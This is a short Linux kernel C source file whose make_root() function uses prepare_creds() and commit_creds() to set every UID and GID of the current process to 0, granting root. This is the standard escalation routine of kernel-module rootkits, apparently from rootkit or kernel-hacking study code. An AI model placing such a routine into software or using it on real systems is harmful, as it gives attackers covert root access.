#include <linux/cred.h>

#include "creds.h"

void
make_root(void)
{
    struct cred *new;

    if(!(new = prepare_creds()))
        return;

    kuid_t root_u = make_kuid(new->user_ns, 0);
    kgid_t root_g = make_kgid(new->user_ns, 0);

    //Effective and real UID
    new->euid = root_u;
    new->uid = root_u;

    //Effective and real GID
    new->egid = root_g;
    new->gid = root_g;

    //Saved UID and GID
    new->suid = root_u;
    new->sgid = root_g;

    //VFS-Ops UID and GID
    new->fsuid = root_u;
    new->fsgid = root_g;

    commit_creds(new);
}